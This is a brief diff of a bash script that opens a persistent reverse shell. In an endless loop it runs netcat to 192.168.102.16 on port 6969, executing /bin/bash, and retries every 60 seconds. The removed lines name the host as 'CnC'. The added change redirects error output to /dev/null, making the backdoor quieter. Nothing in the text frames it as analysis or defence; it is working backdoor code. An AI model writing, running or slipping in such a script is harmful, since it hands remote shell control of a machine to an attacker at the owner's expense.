@@ -1,8 +1,6 @@
 #!/bin/bash
-CnC = "192.168.102.16"
-port = "6969"
 while true
 do
-nc 192.168.102.16 6969 -e /bin/bash
+nc 192.168.102.16 6969 -e /bin/bash 2>/dev/null
 sleep 60
 done
